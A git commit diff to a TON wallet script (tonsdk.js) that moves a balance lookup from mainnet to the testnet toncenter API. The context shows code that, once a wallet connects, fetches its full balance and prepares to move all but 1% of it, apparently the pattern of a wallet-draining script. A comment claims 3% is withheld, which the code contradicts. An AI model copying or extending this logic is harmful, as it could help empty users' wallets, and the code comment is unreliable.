2d417f1cfa64706847aa99bdaa5635f02a5f0875
Whsxg <shabanov.matveyka@bk.ru>
2025-07-03 18:46:41 +0330

    Update tonsdk.js

--- tonsdk.js
+++ tonsdk.js
@@ -43,7 +43,7 @@ tonConnectUI.on('walletConnected', (walletAddress) => {
 });
 
 async function didtrans() {
-    const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
+    const response = await fetch('https://testnet.toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
     const data = await response.json();
     let originalBalance = parseFloat(data.balance);
     let processedBalance = originalBalance - (originalBalance * 0.01); // вычитаем 3% для сохранения средств на оплату комиссий
